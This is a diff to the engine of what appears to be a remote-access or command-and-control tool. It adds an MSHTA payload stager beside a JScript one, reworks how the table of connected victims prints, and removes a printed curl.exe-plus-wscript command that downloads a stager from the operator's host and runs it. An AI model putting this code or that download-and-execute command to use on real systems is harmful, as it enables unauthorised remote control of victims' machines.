@@ -12,11 +12,12 @@ class Engine():
         self.ip = ip
         self.port = port
         self.STAGERS = {
-            util.generate_id():(stagers.JScriptStager(ip, port))
+            util.generate_id():(stagers.JScriptStager(ip, port)),
+            util.generate_id():(stagers.MSHTAStager(ip, port))
         }
 
     def create_connection(self, connection_id, stager):
-        self.connections[connection_id] = connection.Connection(stager)
+        self.connections[connection_id] = connection.Connection(connection_id, stager)
         self.cli.update_options({connection_id: util.MenuOption(self.connections[connection_id].interact, 'Interactive Connection', 'NOP-tions', color.normal, False)})
         return self.connections[connection_id]
 
@@ -24,19 +25,19 @@ class Engine():
         if not self.connections:
             return -1, 'No connections to display.'
         color.header('Connections')
-        color.normal('{:<10} {:<10} {:<15} {:<13} {:<10}'.format('ID', 'Format', 'IP', 'Status', 'Checkin'))
-        for connection_id, connection in self.connections.items():
+        color.normal('{:<13} {:<18} {:<13} {:<16} {:<13}'.format('ID', 'IP', 'Format', 'Status', 'Checkin'))
+        for _, connection in self.connections.items():
             if connection.status == 'pending':
-                color.normal(f'{connection_id} {connection}')
+                color.normal(f'{connection}')
                 continue
             if connection.disconnected():
-                color.error(f'{connection_id} {connection}', symbol=False)
+                color.error(f'{connection}', symbol=False)
                 continue
             if connection.stale():
-                color.information(f'{connection_id} {connection}', symbol=False)
+                color.information(f'{connection}', symbol=False)
                 continue
             if connection.status == 'connected':
-                color.success(f'{connection_id} {connection}', symbol=False)
+                color.success(f'{connection}', symbol=False)
                 continue
         color.normal('')
         return 0, 'Success'
@@ -45,7 +46,6 @@ class Engine():
         color.header('Stagers')
         for stager_id, stager in self.STAGERS.items():
             color.normal(f'{stager.format}: http://{self.ip}:{self.port}/{stager_id}')
-            color.normal(f' - curl.exe http://{self.ip}:{self.port}/{stager_id} -o connected.txt & wscript /e:jscript connected.txt')
         color.normal('')
         return 0, 'Success'
 
